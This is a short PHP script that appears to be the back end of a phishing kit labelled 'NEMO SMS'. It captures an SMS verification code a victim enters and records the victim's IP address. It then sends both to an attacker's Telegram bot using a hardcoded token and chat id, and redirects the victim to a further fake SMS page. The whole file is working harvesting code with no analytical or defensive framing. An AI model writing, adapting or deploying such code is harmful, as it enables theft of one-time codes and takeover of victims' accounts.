<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ NEMO SMS]-----++--\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";


$token = "2097324402:AAHJ4_F72xTIQUI8QxP0rJqA28RTGLZ_0aE";
$data = [
    'text' => $message,
    'chat_id' => '-608946387'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );




header("Location: ../sms/sms2.html");
?>